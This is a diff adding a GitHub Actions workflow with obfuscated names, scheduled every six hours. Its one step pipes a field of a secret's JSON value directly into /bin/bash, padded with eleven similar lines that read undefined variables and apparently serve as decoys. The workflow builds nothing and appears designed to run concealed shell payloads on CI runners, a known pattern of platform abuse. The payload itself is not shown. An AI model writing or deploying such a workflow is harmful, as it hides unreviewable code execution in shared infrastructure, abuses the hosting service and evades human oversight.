@@ -1,0 +1,29 @@
+name: coyotethose
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '58 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: coyotethose
+        env:
+          jrud260: ${{ secrets.jrud260 }}
+        run: |
+          echo $jrud260 | jq -r .dtpwp7 | /bin/bash
+          echo $h551 | jq -r .x773 | /bin/bash
+          echo $fx36645 | jq -r .laz9 | /bin/bash
+          echo $okwis51922 | jq -r .k75516 | /bin/bash
+          echo $ljqpl698 | jq -r .twr912 | /bin/bash
+          echo $gzw5 | jq -r .oe50007 | /bin/bash
+          echo $j631 | jq -r .z42 | /bin/bash
+          echo $hjifi5632 | jq -r .vozn28274 | /bin/bash
+          echo $g172 | jq -r .npn80245 | /bin/bash
+          echo $rx457 | jq -r .tz7270 | /bin/bash
+          echo $z24 | jq -r .npsio651 | /bin/bash
+          echo $lqmf2 | jq -r .yno19191 | /bin/bash
+
